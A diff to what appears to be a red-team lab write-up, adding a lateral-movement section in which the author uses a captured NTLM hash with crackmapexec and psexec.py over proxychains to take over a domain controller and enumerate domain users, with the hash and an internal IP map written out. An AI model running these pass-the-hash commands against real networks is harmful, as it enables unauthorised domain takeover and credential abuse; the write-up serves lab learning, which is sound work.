@@ -349,3 +349,50 @@ Nice I had the child-admin NTLM HASH, we can possibly use this to login to our m
 ```bash
 NTML HASH: dbac2b57a73bb883422658d2aea36967
 ```
+
+# Lateral Movement
+
+## crackmapexec
+
+Using CrackMapExec I will try to check if I can can collect Active Directory information to conduct lateral movement through the network. Since I assumes that 10.10.10.2 is possible domain controller IP, I execute the crackmapexec to it
+
+```bash
+proxychains poetry run crackmapexec smb 10.10.10.2 -u 'child-admin' -H :dbac2b57a73bb883422658d2aea36967
+```
+
+## child.redteam.corp\child-admin
+
+Nice, I got the Pwn3d! and found out that 10.10.10.2 is the domain controller named RED-CHILDDC running on Windows Server 2016 Standard 14393 x64.
+
+![Screenshot 2023-07-08 at 7 58 29 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/03027ab0-7090-41a3-8b81-df52f0c996e7)
+
+| External IP Address | Description |
+| --- | --- |
+| 172.16.25.1 | Out of Scope |
+| 172.16.25.2 | Production-Server |
+| 172.16.25.3 | child.redteam.corp/EMPLOYEE-SYSTEM |
+| Internal IP Address | Description |
+| 10.10.10.1 | Reserved IP of the network |
+| 10.10.10.2 | RED-CHILDDC |
+| 10.10.10.3 | ADMIN-SYSTEM |
+| 10.10.10.4 | unknown |
+| 10.10.10.5 | The compromised Production-Server (Ubuntu 8.04) |
+
+## psexec.py
+
+Using the psexec.py, the child-admin hash and with our active proxy running on 1080. I will login to the Domain Controller IP address through the child-admin user.
+
+```bash
+proxychains psexec.py child.redteam.corp/child-admin@10.10.10.2 -hashes :dbac2b57a73bb883422658d2aea36967
+```
+![Uploading Screenshot 2023-07-08 at 8.07.11 PM.png…]()
+
+There, I got successfully accessed it. 
+
+```bash
+net user /domain
+```
+
+Enumerating more further on the machine, I can see more domain users.
+
+![Screenshot 2023-07-08 at 8 59 30 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/a30ecf73-6965-4f22-a78f-4f7effbccf33)
